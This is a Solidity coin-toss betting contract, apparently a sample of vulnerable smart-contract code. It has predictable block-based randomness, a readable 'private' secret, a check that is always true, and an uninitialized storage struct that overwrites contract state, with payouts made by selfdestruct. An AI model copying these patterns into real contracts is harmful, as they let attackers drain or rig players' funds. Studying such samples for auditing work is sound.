 

pragma solidity ^0.4.25;

 
 
 
 
 
 
 
 
 
 
 
 
 
 
 
 

contract CoinToss_0_03ETH {
  uint256 private secretNumber;
  uint256 public betPrice = 0.03 ether;
  address public ownerAddr;

  struct Game {
    address player;
    uint256 number;
    bool win;
  }

  event GamePlayed(address player, uint256 number, bool win);

  constructor() public {
    ownerAddr = msg.sender;
    tossACoin();
  }

  function tossACoin() internal {
     
    secretNumber = uint8(keccak256(block.timestamp, blockhash(block.number - 1))) % 2 + 1;
  }

  function play(uint256 number) public payable {
    require(msg.value == betPrice, 'Please, bet exactly 0.03 ETH');
    require(number > 1 || number < 2, 'Number must be 1 or 2');

    Game game;
    game.player = msg.sender;
    game.number = number;

    determineWinnerAndSendPayout(game);
  }

  function determineWinnerAndSendPayout(Game game) internal {
    if (game.number == secretNumber) {
       
      game.win = true;
    } else {
       
      game.win = false;
    }

    emit GamePlayed(game.player, game.number, game.win);

    if (game.win) {
      selfdestruct(msg.sender);
    } else {
      selfdestruct(ownerAddr);
    }
  }

  function kill() public {
     
    if (msg.sender == ownerAddr) {
      selfdestruct(msg.sender);
    }
  }

  function() public payable { }
}